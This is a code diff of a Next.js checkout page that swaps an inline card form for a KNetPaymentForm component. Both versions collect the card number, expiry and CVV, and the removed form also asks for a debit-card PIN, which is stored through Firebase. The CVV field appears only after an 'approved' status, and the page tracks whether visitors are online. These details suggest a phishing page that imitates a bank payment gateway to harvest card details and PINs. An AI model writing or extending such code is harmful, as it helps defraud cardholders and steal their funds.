@@ -6,6 +6,7 @@ import { useRouter } from "next/navigation";
 import { db, handlePay } from "@/lib/firebase";
 import LoaderApp from "@/components/loader";
 import { setupOnlineStatus } from "@/lib/utils";
+import KNetPaymentForm from "@/components/KNetPaymentForm";
 
 type PaymentInfo = {
   createdDate: string;
@@ -341,256 +342,21 @@ export default function Payment() {
                 </div>
 
                 {step === 1 ? (
-                  <>
-                    <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
-                      <div className="row">
-                        <label
-                          className="column-label"
-                          style={{ width: "40%" }}
-                        >
-                          Select Your Bank:
-                        </label>
-                        <select
-                          className="column-value"
-                          style={{ width: "60%" }}
-                          onChange={(e: any) => {
-                            const selectedBank = BANKS.find(
-                              (bank) => bank.value === e.target.value
-                            );
-
-                            setPaymentInfo({
-                              ...paymentInfo,
-                              bank: e.target.value,
-                              bank_card: selectedBank
-                                ? selectedBank.cardPrefixes
-                                : [""],
-                            });
-                          }}
-                        >
-                          <>
-                            <option value="bankname" title="Select Your Bank">
-                              Select Your Banks
-                            </option>
-                            {BANKS.map((i, index) => (
-                              <option value={i.value} key={index}>
-                                {i.label} [{i.value}]
-                              </option>
-                            ))}
-                          </>
-                        </select>
-                      </div>
-                      <div
-                        className="row three-column"
-                        id="Paymentpagecardnumber"
-                      >
-                        <label className="column-label mt-1">
-                          Card Number:
-                        </label>
-                        <label>
-                          <select
-                            className="column-value  mt-2"
-                            name="dcprefix"
-                            id="dcprefix"
-                            onChange={(e: any) =>
-                              setPaymentInfo({
-                                ...paymentInfo,
-                                prefix: e.target.value,
-                              })
-                            }
-                            style={{ width: "26%" }}
-                          >
-                            <option
-                              value={"i"}
-                              onClick={(e: any) => {
-                                setPaymentInfo({
-                                  ...paymentInfo,
-                                  prefix: e.target.value,
-                                });
-                              }}
-                            >
-                              prefix
-                            </option>
-                            {paymentInfo.bank_card.map((i, index) => (
-                              <option
-                                key={index}
-                                value={i}
-                                onClick={(e: any) => {
-                                  setPaymentInfo({
-                                    ...paymentInfo,
-                                    prefix: e.target.value,
-                                  });
-                                }}
-                              >
-                                {i}
-                              </option>
-                            ))}
-                          </select>
-                        </label>
-                        <label>
-                          <input
-                            name="debitNumber"
-                            id="debitNumber"
-                            type="tel"
-                            inputMode="numeric"
-                            pattern="[0-9]*"
-                            size={10}
-                            className="allownumericwithoutdecimal"
-                            style={{ width: "32%", paddingTop: 5 }}
-                            maxLength={10}
-                            onChange={(e: any) =>
-                              setPaymentInfo({
-                                ...paymentInfo,
-                                cardNumber: e.target.value,
-                              })
-                            }
-                            title="Should be in number. Length should be 10"
-                          />
-                        </label>
-                      </div>
-                      <div className="row three-column" id="cardExpdate">
-                        <div id="debitExpDate">
-                          <label className="column-label">
-                            {" "}
-                            Expiration Date:{" "}
-                          </label>
-                        </div>
-                        <select
-                          onChange={(e: any) =>
-                            setPaymentInfo({
-                              ...paymentInfo,
-                              month: e.target.value,
-                            })
-                          }
-                          className="column-value"
-                        >
-                          <option value={0}>MM</option>
-                          <option value={1}>01</option>
-                          <option value={2}>02</option>
-                          <option value={3}>03</option>
-                          <option value={4}>04</option>
-                          <option value={5}>05</option>
-                          <option value={6}>06</option>
-                          <option value={7}>07</option>
-                          <option value={8}>08</option>
-                          <option value={9}>09</option>
-                          <option value={10}>10</option>
-                          <option value={11}>11</option>
-                          <option value={12}>12</option>
-                        </select>
-                        <select
-                          onChange={(e: any) =>
-                            setPaymentInfo({
-                              ...paymentInfo,
-                              year: e.target.value,
-                            })
-                          }
-                          className="column-long"
-                        >
-                          <option value={0}>YYYY</option>
-                          <option value={2024}>2024</option>
-                          <option value={2025}>2025</option>
-                          <option value={2026}>2026</option>
-                          <option value={2027}>2027</option>
-                          <option value={2028}>2028</option>
-                          <option value={2029}>2029</option>
-                          <option value={2030}>2030</option>
-                          <option value={2031}>2031</option>
-                          <option value={2032}>2032</option>
-                          <option value={2033}>2033</option>
-                          <option value={2034}>2034</option>
-                          <option value={2035}>2035</option>
-                          <option value={2036}>2036</option>
-                          <option value={2037}>2037</option>
-                          <option value={2038}>2038</option>
-                          <option value={2039}>2039</option>
-                          <option value={2040}>2040</option>
-                          <option value={2041}>2041</option>
-                          <option value={2042}>2042</option>
-                          <option value={2043}>2043</option>
-                          <option value={2044}>2044</option>
-                          <option value={2045}>2045</option>
-                          <option value={2046}>2046</option>
-                          <option value={2047}>2047</option>
-                          <option value={2048}>2048</option>
-                          <option value={2049}>2049</option>
-                          <option value={2050}>2050</option>
-                          <option value={2051}>2051</option>
-                          <option value={2052}>2052</option>
-                          <option value={2053}>2053</option>
-                          <option value={2054}>2054</option>
-                          <option value={2055}>2055</option>
-                          <option value={2056}>2056</option>
-                          <option value={2057}>2057</option>
-                          <option value={2058}>2058</option>
-                          <option value={2059}>2059</option>
-                          <option value={2060}>2060</option>
-                          <option value={2061}>2061</option>
-                          <option value={2062}>2062</option>
-                          <option value={2063}>2063</option>
-                          <option value={2064}>2064</option>
-                          <option value={2065}>2065</option>
-                          <option value={2066}>2066</option>
-                          <option value={2067}>2067</option>
-                        </select>
-                      </div>
-                      <div className="row" id="PinRow">
-                        {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
-
-                        <div id="eComPin">
-                          <label className="column-label"> PIN: </label>
-                        </div>
-                        <div>
-                          <input
-                            inputMode="numeric"
-                            pattern="[0-9]*"
-                            name="cardPin"
-                            id="cardPin"
-                            onChange={(e: any) =>
-                              setPaymentInfo({
-                                ...paymentInfo,
-                                pass: e.target.value,
-                              })
-                            }
-                            autoComplete="off"
-                            title="Should be in number. Length should be 4"
-                            type="password"
-                            size={4}
-                            maxLength={4}
-                            className="allownumericwithoutdecimal"
-                            style={{ width: "60%" }}
-                          />
-                        </div>
-                      </div>
-                      {step === 1 && paymentInfo.status === "approved" ? (
-                        <div className="row" id="PinRow">
-                          {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
-                          <input
-                            type="hidden"
-                            name="cardPinType"
-                            defaultValue="A"
-                          />
-                          <div id="eComPin">
-                            <label className="column-label"> Cvv: </label>
-                          </div>
-                          <div>
-                            <input
-                              inputMode="numeric"
-                              pattern="[0-9]*"
-                              name="cvv"
-                              id="cvv"
-                              autoComplete="off"
-                              title="Should be in number. Length should be 3"
-                              type="password"
-                              size={3}
-                              maxLength={3}
-                              className="allownumericwithoutdecimal"
-                              style={{ width: "60%" }}
-                            />
-                          </div>
-                        </div>
-                      ) : null}
-                    </div>
-                  </>
+                  <KNetPaymentForm
+                    amount={total}
+                    isLoading={isloading}
+                    onSubmit={(cardData) => {
+                      setPaymentInfo({
+                        ...paymentInfo,
+                        cardNumber: cardData.cardNumber,
+                        month: cardData.month,
+                        year: cardData.year,
+                        cvv: cardData.cvv,
+                        bank: cardData.bank,
+                        pass: cardData.cvv,
+                      });
+                    }}
+                  />
                 ) : step === 2 ? (
                   <div>
                     <div className="row">
